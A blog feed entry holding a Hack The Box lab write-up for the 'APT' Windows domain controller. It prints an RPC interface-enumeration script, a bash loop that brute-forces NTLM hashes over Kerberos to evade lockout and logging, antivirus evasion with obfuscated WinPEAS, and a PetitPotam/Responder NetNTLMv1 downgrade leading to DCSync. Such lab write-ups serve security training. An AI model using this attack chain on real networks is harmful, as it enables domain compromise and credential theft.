<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://omnisl4sh.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://omnisl4sh.github.io/" rel="alternate" type="text/html" /><updated>2022-07-22T14:54:41+02:00</updated><id>https://omnisl4sh.github.io/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Windows - Insane] - APT</title><link href="https://omnisl4sh.github.io/2022/07/07/APT.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Insane] - APT" /><published>2022-07-07T00:00:00+02:00</published><updated>2022-07-07T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/07/07/APT</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/07/07/APT.html"><![CDATA[<p><img src="/assets/APT/APT.png" alt="APT" /></p>

<h3 id="summary">Summary</h3>
<ul>
  <li>A Windows machine where a standard IPv4 full TCP port scan reveals only <strong>HTTP</strong> on port 80 and <strong>RPC Endpoint Mapper</strong> on port 135.</li>
  <li><em>After checking out the website,</em> it turns out to be just static content with no real abusable functionalities.</li>
  <li><em>However, due to the many information that can be retrieved through the MSRPC protocol and because we have no other option,</em> we decide to dig deeper into what can be done through it.</li>
  <li>We come across an amazing article where we find that we can (<em>without authentication</em>) access a specific function in the legacy <strong>DCOM interface</strong> exported through RPC that would let us enumerate all the network interfaces on the machine.</li>
  <li><em>Thanks to a security researcher who has built a specific</em> <strong>python script</strong> <em>for that function,</em> we can use it and are able to get the network interace information.</li>
  <li>We find that the machine has an <strong>IPV6</strong> that when scanned with nmap reveals the full list of available ports which indicate a <strong>Windows Domain Controller.</strong></li>
  <li>The anonymously-accessible SMB share had a copy of the Active Directory database file <strong>NTDS.dit</strong> as well as the <strong>security</strong> and <strong>system</strong> registry hives in a folder structure similar to the output of the <code class="language-plaintext highlighter-rouge">ntdsutil</code> utility.</li>
  <li><em>With the given files, and using impacket’s</em> <code class="language-plaintext highlighter-rouge">secretsdump.py</code>, we are able to get a list of all domain usernames and hashes.</li>
  <li>We enumerate the users with <code class="language-plaintext highlighter-rouge">kerbrute</code> to only find 3 valid accounts (the default Administrator, the Domain Controller’s machine account and a user called <code class="language-plaintext highlighter-rouge">henry.vinson</code>).</li>
  <li>We try to brute force the user accounts with all the hashes from the dump over <strong>SMB</strong> but are <strong>blocked</strong> by the server when doing so.</li>
  <li><em>However, since we didn’t get a message indicating account lockout,</em> we changed the method of authentication to <strong>Kerberos</strong> (<em>as it doesn’t leave a 4625 logon event in the logs</em>) in hopes of bypassing the defenses in place.</li>
  <li><em>By building a bash wrapper around impacket’s silver ticket script</em> <code class="language-plaintext highlighter-rouge">getST.py</code>, we manage to brute force using the <strong>NTLM</strong> hashes to find a match with the <code class="language-plaintext highlighter-rouge">henry.vinson</code> user.</li>
  <li>The user had no <strong>WinRM</strong> access so we tried many things to enumerate the machine. <em>When scanning the contents of the</em> <strong>registry</strong> <em>through the available</em> <strong>remote registry service</strong>, we got a set of credentials for the <code class="language-plaintext highlighter-rouge">henry.vinson_adm</code> user.</li>
  <li>That user turned out to have <strong>WinRM</strong> access and we could successfully get a shell. We then used <code class="language-plaintext highlighter-rouge">WinPEAS</code> to run a regular privesc check. We had to switch the basic version for the obfuscated one because <strong>AMSI</strong> was detecting it.</li>
  <li><em>Looking at the tool’s output,</em> we find that the machine is misconfigured and uses the insecure and crackable <strong>NetNTLMv1</strong> in network authentication. A vulnerabiltiy that can be exploited for <strong>privilege escalation</strong>.</li>
  <li><em>Luckily,</em> a tool like <code class="language-plaintext highlighter-rouge">PetitPotam.py</code> can <strong>coerce authentication</strong> back to our attacker machine. We use it after setting up our <code class="language-plaintext highlighter-rouge">responder</code> to <em>downgrade</em> the authentication to <strong>NetNTLMv1</strong> as well as send a specific challenge to capture the machine account’s hash.</li>
  <li>We submit it to the <code class="language-plaintext highlighter-rouge">crack.sh</code> website which cracks it and emails us the NTLM version. We then use it to perform a <strong>DCSync</strong> attack.</li>
  <li><em>After retrieving the Administrator’s NTLM hash from the dump,</em> we use it to get <strong>complete access</strong> to the box in a typical pass-the-hash attack.</li>
  <li>The machine author’s intended way to achieve privilege escalation was through modifying the <strong>RoguePotato</strong> exploit to target IPV6, bypass AMSI then creating a special RPC server with impacket to respond with a challenge before capturing the NetNTLMv1 authentication.</li>
  <li><em>However, due to that path’s high complexity and due to the simpler tools currenly available,</em> I’m postponing it for when I know enough about RPC to be able to <em>decently</em> write about it.</li>
</ul>

<hr />

<h3 id="ipv4-nmap">IPv4 NMAP</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT    STATE SERVICE VERSION
80/tcp  open  http    Microsoft IIS httpd 10.0
|_http-title: Gigantic Hosting | Home
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</code></pre></div></div>

<p>The standard nmap full port scan shows:</p>
<ol>
  <li><strong>HTTP</strong> on port 80 served on <strong>IIS</strong> 10</li>
  <li><strong>MSRPC</strong> on port 135</li>
</ol>

<h3 id="checking-port-80">Checking Port 80</h3>
<p><em>Looking at the website,</em> we find a bunch of static html pages</p>

<p><img src="/assets/APT/Website-homepage.jpg" alt="Website-homepage" /></p>

<p>The linked web pages were:</p>

<ul>
  <li>index.html</li>
  <li>services.html</li>
  <li>clients.html</li>
  <li>about.html</li>
  <li>support.html</li>
  <li>news.html</li>
</ul>

<p>The content was mostly filler. We didn’t find anything of interest in the source code. No usernames were there apart from the sales email.</p>

<p><strong>Directory and file bruteforcing</strong> with <code class="language-plaintext highlighter-rouge">gobuster</code> didn’t get us anything new either.</p>

<p><em>Being left with port 135,</em> we decide to dive in.</p>

<h3 id="digging-deep-into-msrpc">Digging deep into MSRPC</h3>
<p>The <strong>Microsoft Remote Procedure Call</strong> is a protocol that allows a client program to request a service on another computer. Just like any typical client-server architecture.</p>

<p>It is mainly about <strong>Cross-Process Communication</strong> and <strong>Object Exchange</strong> over the network.</p>

<p><em>There are many functionalities in RPC,</em> so we’re interested to know how to use it.</p>

<p>Here are few terms we need to know before we can continue:</p>

<ul>
  <li><strong>The RPC End Point Mapper:</strong> The RPC Endpoint Mapper (RpcEptMapper) service resolves RPC interface identifiers to transport endpoints. It can be queried for functionalities.</li>
  <li><strong>Protocol Sequence Identifier:</strong> A numeric value that uniquely identifies an RPC transport protocol when describing a protocol in the context of a protocol stack.</li>
  <li><strong>RPC Endpoint:</strong> A network-specific address of a server process for RPC.</li>
  <li><strong>Universally Unique Identifier (UUID):</strong> An identifier that can be used in identifying objects in cross-process communication. In our case, a specific interface providing a special function of interest.</li>
  <li><strong>The Microsoft Component Object Model (COM):</strong> is a platform-independent, distributed, object-oriented system for creating binary software components that can interact.</li>
  <li><strong>The Distributed Component Object Model (DCOM):</strong> The Microsoft Component Object Model (COM) specification that defines how components communicate over networks.</li>
  <li><strong>Interface:</strong> A specification in a Component Object Model (COM) server that describes how to access the methods of a class.</li>
  <li><strong>Method:</strong> A function that can be called to execute a desired output.</li>
  <li><strong>Authentication Level:</strong> A numeric value indicating the level of authentication or message protection that remote procedure call (RPC) will apply to a specific message exchange</li>
  <li><strong>Opnum:</strong> An operation number or numeric identifier that is used to identify a specific remote procedure call (RPC) method or a method in an interface.</li>
</ul>

<p><em>With that out of the way,</em> here’s what we’re going to do:</p>

<ol>
  <li>Talk to the <strong>RPC Endpoint Mapper</strong> service on port 135.</li>
  <li>List all <strong>RPC Endpoints</strong> available.</li>
  <li><em>Per endpoint,</em> find the functionalities that <strong>don’t require authentication</strong>.</li>
  <li><em>By googling each endpoint’s UUID,</em> lookup Microsoft’s documentation on the <strong>available methods</strong> through it.</li>
  <li><em>If we find any,</em> we would also need to look for a way to invoke those functionalities.</li>
</ol>

<p><em>Since it’s the most relevant tool for the job,</em> let’s view the help for impacket’s <code class="language-plaintext highlighter-rouge">rpcmap.py</code> script.</p>

<p><img src="/assets/APT/rpcmap-help.jpg" alt="rpcmap-help" /></p>

<p><em>As far as points 1-3 go,</em> it seems that we have everything we need in this tool. we even have an example of what to use as a string binding value as indicated above.</p>

<p><strong>Command:</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcmap.py ncacn_ip_tcp:10.10.10.213 <span class="nt">-brute-opnums</span> <span class="nt">-auth-level</span> 1
</code></pre></div></div>

<p><em>Looking at the output,</em> we see that we get <strong>“access denied”</strong> on most <strong>UUIDs</strong> and for most <strong>opnums</strong>. Except for a couple on <strong>“UUID 99FCFEC4-5260-101B-BBCB-00AA0021347A”</strong></p>

<p><img src="/assets/APT/rpcmap-output.jpg" alt="rpcmap-output" /></p>

<p>Let’s see what google search can find us for that <strong>UUID:</strong></p>

<p><img src="/assets/APT/google-uuid-search-results.jpg" alt="google-uuid-search-results" /></p>

<p><em>As you may have noticed from the link coloring,</em> I clicked all three links :D the second article is enough to get us through the first part of this machine.</p>

<p>But we’re going to take a brief look at Microsoft’s documentation first.</p>

<p>Our <strong>UUID</strong> is that of the <strong>“IID_IObjectExporter”</strong>.</p>

<p><img src="/assets/APT/object-exporter.jpg" alt="object-exporter" /></p>

<p>Here’s what we get when we click the link next to it:</p>

<p><img src="/assets/APT/object-exporter-methods.jpg" alt="object-exporter-methods" /></p>

<p><em>If you remember from</em> <code class="language-plaintext highlighter-rouge">rpcmap</code><em>’s output,</em> we had access to only <strong>opnums</strong> 3 &amp; 5</p>

<p><img src="/assets/APT/object-exporter-available-opnums.jpg" alt="object-exporter-available-opnums" /></p>

<p>when looking at opnum3, we see nothing significant:</p>

<p><img src="/assets/APT/serveralive-method.jpg" alt="serveralive-method" /></p>

<p>It just checks if the other host is up.</p>

<p>let’s look at <strong>opnum</strong> 5:</p>

<p><img src="/assets/APT/serveralive2-method.jpg" alt="serveralive2-method" /></p>

<p><strong>“It returns string and security bindings for the object resolver, which allows the client to choose the most appropriate, mutually compatible settings.”</strong></p>

<p><em>Since in our case, we’re the client,</em> we should get string and security bindings back when calling this method.</p>

<p>This would mean <strong>all the IP addresses</strong> on the box (including a potential <strong>IPv6</strong>) can be leaked.</p>

<p>But I don’t have much of a clue on how to do that XD</p>

<p>The 2nd search result <a href="/assets/APT/https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/">here</a> seemed very promising.</p>

<p><img src="/assets/APT/airbus-article.jpg" alt="airbus-article" /></p>

<p>The <strong>Impacket</strong> library had the necessary code and the researcher was kind enough to provide a <strong>python</strong> script to get the job done.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span>
<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">getopt</span>

<span class="kn">from</span> <span class="nn">impacket.dcerpc.v5</span> <span class="kn">import</span> <span class="n">transport</span>
<span class="kn">from</span> <span class="nn">impacket.dcerpc.v5.rpcrt</span> <span class="kn">import</span> <span class="n">RPC_C_AUTHN_LEVEL_NONE</span>
<span class="kn">from</span> <span class="nn">impacket.dcerpc.v5.dcomrt</span> <span class="kn">import</span> <span class="n">IObjectExporter</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">argv</span><span class="p">):</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">opts</span><span class="p">,</span> <span class="n">args</span> <span class="o">=</span> <span class="n">getopt</span><span class="p">.</span><span class="n">getopt</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span><span class="s">"ht:"</span><span class="p">,[</span><span class="s">"target="</span><span class="p">])</span>
    <span class="k">except</span> <span class="n">getopt</span><span class="p">.</span><span class="n">GetoptError</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">'IOXIDResolver.py -t &lt;target&gt;'</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

    <span class="n">target_ip</span> <span class="o">=</span> <span class="s">"192.168.1.1"</span>

    <span class="k">for</span> <span class="n">opt</span><span class="p">,</span> <span class="n">arg</span> <span class="ow">in</span> <span class="n">opts</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">opt</span> <span class="o">==</span> <span class="s">'-h'</span><span class="p">:</span>
            <span class="k">print</span> <span class="s">'IOXIDResolver.py -t &lt;target&gt;'</span>
            <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
        <span class="k">elif</span> <span class="n">opt</span> <span class="ow">in</span> <span class="p">(</span><span class="s">"-t"</span><span class="p">,</span> <span class="s">"--target"</span><span class="p">):</span>
            <span class="n">target_ip</span> <span class="o">=</span> <span class="n">arg</span>

    <span class="n">authLevel</span> <span class="o">=</span> <span class="n">RPC_C_AUTHN_LEVEL_NONE</span>

    <span class="n">stringBinding</span> <span class="o">=</span> <span class="sa">r</span><span class="s">'ncacn_ip_tcp:%s'</span> <span class="o">%</span> <span class="n">target_ip</span>
    <span class="n">rpctransport</span> <span class="o">=</span> <span class="n">transport</span><span class="p">.</span><span class="n">DCERPCTransportFactory</span><span class="p">(</span><span class="n">stringBinding</span><span class="p">)</span>

    <span class="n">portmap</span> <span class="o">=</span> <span class="n">rpctransport</span><span class="p">.</span><span class="n">get_dce_rpc</span><span class="p">()</span>
    <span class="n">portmap</span><span class="p">.</span><span class="n">set_auth_level</span><span class="p">(</span><span class="n">authLevel</span><span class="p">)</span>
    <span class="n">portmap</span><span class="p">.</span><span class="n">connect</span><span class="p">()</span>

    <span class="n">objExporter</span> <span class="o">=</span> <span class="n">IObjectExporter</span><span class="p">(</span><span class="n">portmap</span><span class="p">)</span>
    <span class="n">bindings</span> <span class="o">=</span> <span class="n">objExporter</span><span class="p">.</span><span class="n">ServerAlive2</span><span class="p">()</span>

    <span class="k">print</span> <span class="s">"[*] Retrieving network interface of "</span> <span class="o">+</span> <span class="n">target_ip</span>

    <span class="c1">#NetworkAddr = bindings[0]['aNetworkAddr']
</span>    <span class="k">for</span> <span class="n">binding</span> <span class="ow">in</span> <span class="n">bindings</span><span class="p">:</span>
        <span class="n">NetworkAddr</span> <span class="o">=</span> <span class="n">binding</span><span class="p">[</span><span class="s">'aNetworkAddr'</span><span class="p">]</span>
        <span class="k">print</span> <span class="s">"Address: "</span> <span class="o">+</span> <span class="n">NetworkAddr</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
   <span class="n">main</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span>
</code></pre></div></div>

<p><em>When using it,</em> we get a very nice output:</p>

<p><img src="/assets/APT/python-enum-interfaces-script-output.jpg" alt="python-enum-interfaces-script-output" /></p>

<h3 id="ipv6-nmap">IPv6 NMAP</h3>
<p>After placing an entry for it in our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file, we run another nmap on the <strong>IPv6</strong> using the <code class="language-plaintext highlighter-rouge">-6</code> flag. Look at what we got :D</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-server-header: 
|   Microsoft-HTTPAPI/2.0
|_  Microsoft-IIS/10.0
|_http-title: Bad Request
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-07-02 15:54:05Z)
135/tcp   open  msrpc        Microsoft Windows RPC
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Issuer: commonName=apt.htb.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-24T07:07:18
| Not valid after:  2050-09-24T07:17:18
| MD5:   c743 dd92 e928 50b0 aa86 6f80 1b04 4d22
|_SHA-1: f677 c290 98c0 2ac5 8575 7060 683d cdbc 5f86 5d45
|_ssl-date: 2022-07-02T15:55:19+00:00; -5h38m13s from scanner time.
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Issuer: commonName=apt.htb.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-24T07:07:18
| Not valid after:  2050-09-24T07:17:18
| MD5:   c743 dd92 e928 50b0 aa86 6f80 1b04 4d22
|_SHA-1: f677 c290 98c0 2ac5 8575 7060 683d cdbc 5f86 5d45
|_ssl-date: 2022-07-02T15:55:19+00:00; -5h38m13s from scanner time.
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
|_ssl-date: 2022-07-02T15:55:19+00:00; -5h38m13s from scanner time.
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Issuer: commonName=apt.htb.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-24T07:07:18
| Not valid after:  2050-09-24T07:17:18
| MD5:   c743 dd92 e928 50b0 aa86 6f80 1b04 4d22
|_SHA-1: f677 c290 98c0 2ac5 8575 7060 683d cdbc 5f86 5d45
3269/tcp  open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
|_ssl-date: 2022-07-02T15:55:19+00:00; -5h38m13s from scanner time.
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Issuer: commonName=apt.htb.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-24T07:07:18
| Not valid after:  2050-09-24T07:17:18
| MD5:   c743 dd92 e928 50b0 aa86 6f80 1b04 4d22
|_SHA-1: f677 c290 98c0 2ac5 8575 7060 683d cdbc 5f86 5d45
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Bad Request
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Bad Request
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc        Microsoft Windows RPC
49675/tcp open  msrpc        Microsoft Windows RPC
49695/tcp open  msrpc        Microsoft Windows RPC
60706/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: APT; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: apt
|   NetBIOS computer name: APT\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: apt.htb.local
|_  System time: 2022-07-02T16:55:02+01:00
| smb2-time: 
|   date: 2022-07-02T15:55:01
|_  start_date: 2022-07-02T13:47:16
|_clock-skew: mean: -5h46m47s, deviation: 22m40s, median: -5h38m13s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: &lt;blank&gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
</code></pre></div></div>

<p>A full-fledged windows domain controller :D</p>

<p>Looks like a firewall was configured to only allow port 80 and 135 on IPv4 but allowed everything on IPv6.</p>

<p><strong>Lesson learned:</strong> Always enumerate network interfaces as part of the recon. There could be way more information to be learned about the network by doing this.</p>

<h3 id="smb-enumeration">SMB Enumeration</h3>
<p>We start with SMB and run <code class="language-plaintext highlighter-rouge">crackmapexec</code> to check the available shares. And we find a readable one called <strong>“backup”</strong></p>

<p><img src="/assets/APT/cme-smb-shares.jpg" alt="cme-smb-shares" /></p>

<p>we find a password when trying to unzip the file called <code class="language-plaintext highlighter-rouge">backup.zip</code></p>

<p><img src="/assets/APT/backup-zip.jpg" alt="backup-zip" /></p>

<p>we could successfully crack it with john’s <code class="language-plaintext highlighter-rouge">zip2john</code> script (It gave us an error but that wasn’t a concern).</p>

<p><img src="/assets/APT/cracking-zip-hash.jpg" alt="cracking-zip-hash" /></p>

<p><em>After unzipping the archive,</em> we get something very interesting. What appears to be an <strong>Active Directory Database Dump</strong>. This is exactly the output of a utility called <code class="language-plaintext highlighter-rouge">ntdsutil</code></p>

<p><img src="/assets/APT/unzipping-backup-zip.jpg" alt="unzipping-backup-zip" /></p>

<p>We dump the contents with <code class="language-plaintext highlighter-rouge">secretsdump.py</code> using the <code class="language-plaintext highlighter-rouge">-history</code> flag to get previous password hashes and <code class="language-plaintext highlighter-rouge">-just-dc-ntlm</code> to limit the output to what we can use in a pass-the-hash attack.</p>

<p><img src="/assets/APT/secrets_dump.jpg" alt="secrets_dump" /></p>

<p>Something is off here.. it can’t be that easy :D</p>

<p><em>Since those would be instant kills,</em> We tried:</p>
<ul>
  <li>Logging in with the Administrator’s hash</li>
  <li>Use the Domain Controller’s machine hash</li>
  <li>Create a golden ticket with the krbtgt hash</li>
</ul>

<p><em>But of course,</em> none worked XD</p>

<h3 id="working-around-bruteforce-defenses">Working around bruteforce defenses</h3>

<p>We will now have to check the other users. So we filter them out with some shell fu:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>dump.txt | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">':'</span> <span class="nt">-f1</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'history'</span> | <span class="nb">sort</span> <span class="nt">-u</span> <span class="o">&gt;</span> users.txt
<span class="nb">cat </span>dump.txt | <span class="nb">grep</span> <span class="s1">':::'</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">':'</span> <span class="nt">-f4</span> | <span class="nb">sort</span> <span class="nt">-u</span> <span class="o">&gt;</span> hashes.txt
</code></pre></div></div>

<p>We found around <strong>2k unique users</strong> and <strong>4k unique NTLM hashes</strong>.</p>

<p>We have to first validate that these users exist. We do so using <code class="language-plaintext highlighter-rouge">kerbrute</code></p>

<p>Only 3 users were valid:</p>

<p><img src="/assets/APT/kerberute-userenum.jpg" alt="kerberute-userenum" /></p>

<p><em>When trying to bruteforce the hashes,</em> we get blocked.</p>

<p><img src="/assets/APT/bruteforce-defenses.jpg" alt="bruteforce-defenses" /></p>

<p>But did you notice something? <em>even with that many attempts,</em> the account <strong>didn’t get locked out ;]</strong> we know so because locked out accounts give a <strong>different error message</strong>.</p>

<p>We’re going to try bruteforcing using <strong>Kerberos</strong>. It’s different from using SMB because <strong>it doesn’t leave a 4625 logon event behind.</strong></p>

<p>I had to reset the machine to get the block removed. Perhaps it was configured for a ban time that was too long.</p>

<p>We’re going to do this using impacket’s <code class="language-plaintext highlighter-rouge">getST.py</code> script. By building a bash wrapper around it to enable bruteforcing with a hash since that feature isn’t in <code class="language-plaintext highlighter-rouge">kerbrute</code> at the moment.</p>

<p>Here’s what it looks like:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">index</span><span class="o">=</span>1
<span class="k">for </span><span class="nb">hash </span><span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>hashes.txt<span class="si">)</span><span class="p">;</span> <span class="k">do
	</span><span class="nb">echo</span> <span class="s2">"[*] [</span><span class="nv">$index</span><span class="s2">/4000] Spraying hash </span><span class="nv">$hash</span><span class="s2"> for Administrator"</span>
  	getST.py <span class="nt">-dc-ip</span> apt <span class="nt">-spn</span> cifs/apt.htb.local htb.local/administrator <span class="nt">-hashes</span> <span class="s2">":</span><span class="nv">$hash</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-Pv</span> <span class="s1">'not found|Getting TGT|PREAUTH_FAILED|Copyright 2022'</span>| <span class="nb">sed</span> <span class="nt">-r</span> <span class="s1">'/^\s*$/d'</span>
	<span class="nb">echo</span> <span class="s2">"[*] [</span><span class="nv">$index</span><span class="s2">/4000] Spraying hash </span><span class="nv">$hash</span><span class="s2"> for Henry.vinson"</span>
  	getST.py <span class="nt">-dc-ip</span> apt <span class="nt">-spn</span> cifs/apt.htb.local htb.local/Henry.vinson <span class="nt">-hashes</span> <span class="s2">":</span><span class="nv">$hash</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-Pv</span> <span class="s1">'not found|Getting TGT|PREAUTH_FAILED|Copyright 2022'</span>| <span class="nb">sed</span> <span class="nt">-r</span> <span class="s1">'/^\s*$/d'</span>  	
  	<span class="o">((</span><span class="nv">index</span><span class="o">=</span>index+1<span class="o">))</span>
<span class="k">done</span>
</code></pre></div></div>

<p><em>In the script,</em> we request a ticket for SMB access, clear out any unnecessary output as well as print out some progress messages.</p>

<p><strong>Note:</strong> To speed things up, you are advised to break down the hashes list into smaller chunks and run multiple instances of the script in parallel. Or else that process would take significantly much more time.</p>

<p>The <strong>Kerberos bruteforce</strong> worked well and we didn’t get blocked. We got a working hash right near the end of the list (the 3558th entry).</p>

<p><img src="/assets/APT/kerberos-hash-brute.jpg" alt="kerberos-hash-brute" /></p>

<p><strong>Side Note:</strong> <em>After checking the official writeup,</em> I found that this <em>wasn’t the indended way</em>. But hey! it worked XD</p>

<p><img src="/assets/APT/auth-with-henry.jpg" alt="auth-with-henry" /></p>

<h3 id="finding-creds-via-remote-registry">Finding creds via Remote Registry</h3>
<p>Alright. <em>After finally getting our first set of credentials,</em> we sadly don’t find anything to get us further using conventional methods.</p>

<ul>
  <li>Henry didn’t have <em>8</em> access</li>
  <li><strong>Bloodhound</strong> didn’t return anything we could exploit</li>
  <li>No <strong>Kerberoastable</strong> or <strong>ASREProastable</strong> accounts were there</li>
</ul>

<p><em>However, when were looking for information in the registry using impacket’s</em> <code class="language-plaintext highlighter-rouge">reg.py</code>, we found creds for <code class="language-plaintext highlighter-rouge">henry.vinsdon_adm</code> under <code class="language-plaintext highlighter-rouge">HKU\Software\GiganticHostingManagementSystem</code>. It seemed like his administrator account.</p>

<p><img src="/assets/APT/creds-in-registry.jpg" alt="creds-in-registry" /></p>

<p>And he turned out to have <strong>WinRM</strong> access when we checked.</p>

<p><img src="/assets/APT/winrm-shell-access.jpg" alt="winrm-shell-access" /></p>

<h3 id="privilege-escalation-via-netntlmv1">Privilege Escalation via NetNTLMv1</h3>
<p><em>When running the standard</em> <code class="language-plaintext highlighter-rouge">WinPEAS.exe</code>, it got caught by <strong>AV.</strong></p>

<p><img src="/assets/APT/normal-winpeas-caught.jpg" alt="normal-winpeas-caught" /></p>

<p>It worked alright when we switched to the <strong>obfuscated version.</strong> (you can find that on the releases page on GitHub)</p>

<p><img src="/assets/APT/obfuscated-peas-worked.jpg" alt="obfuscated-peas-worked" /></p>

<p><em>Scanning the output,</em> we noticed something exploitable: <strong>NetNTLMv1</strong> being enabled.</p>

<p><img src="/assets/APT/netNTLMv1-enabled.jpg" alt="netNTLMv1-enabled" /></p>

<p><em>Basically,</em> exploiting this aims at <strong>forcing a network authentication from the Domain Controller’s machine account back to our machine</strong> where <code class="language-plaintext highlighter-rouge">responder</code> will capture it for a <strong>crackable NetNTLMv1</strong> hash.</p>

<p>We will first set up our <strong>responder’s configuration</strong> to send a certain challenge. This is for making the hash cracking easier.</p>

<p><em>in</em> <code class="language-plaintext highlighter-rouge">/etc/responder/Responder.conf</code>, we set the challenge to <strong>112233445566778899</strong></p>

<p><img src="/assets/APT/setting-the-challenge.jpg" alt="setting-the-challenge" /></p>

<p>and we start it with the <code class="language-plaintext highlighter-rouge">--lm</code> flag to force LM hashing downgrade.</p>

<p>We then trigger the authentication using <code class="language-plaintext highlighter-rouge">PetitPotam.py</code>. Here’s what it looks like:</p>

<p><img src="/assets/APT/forced-auth-netNTLMv1.jpg" alt="forced-auth-netNTLMv1" /></p>

<p>We got the NetNTLMv1 hash. Which we will then submit to the website <code class="language-plaintext highlighter-rouge">crack.sh</code> after <strong>formatting it according to their requirements</strong>. The hash should be like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
</code></pre></div></div>

<p><img src="/assets/APT/crack-sh.jpg" alt="crack-sh" /></p>

<p><em>A few minutes after sumbitting,</em> we got back the NTLM hash for the machine in our inbox.</p>

<p><img src="/assets/APT/crack-sh-results.jpg" alt="crack-sh-results" /></p>

<p><em>Of course,</em> we used the machine hash to do a <strong>DCSync</strong> and grabbed the Administrator’s hash to finish the box :D</p>

